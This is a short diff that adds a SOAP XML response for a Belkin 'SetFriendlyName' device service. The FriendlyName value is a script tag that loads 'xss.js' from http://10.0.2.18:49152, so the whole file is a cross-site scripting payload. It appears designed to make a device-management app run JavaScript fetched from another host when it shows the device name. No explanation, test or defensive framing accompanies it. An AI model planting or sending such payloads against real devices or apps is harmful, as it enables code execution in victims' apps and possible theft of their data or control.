@@ -1,0 +1,5 @@
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>
+<u:SetFriendlyNameResponse xmlns:u="urn:Belkin:service:basicevent:1">
+<FriendlyName><script src=http://10.0.2.18:49152/ll/xss.js></script></FriendlyName>
+</u:SetFriendlyNameResponse>
+</s:Body> </s:Envelope>
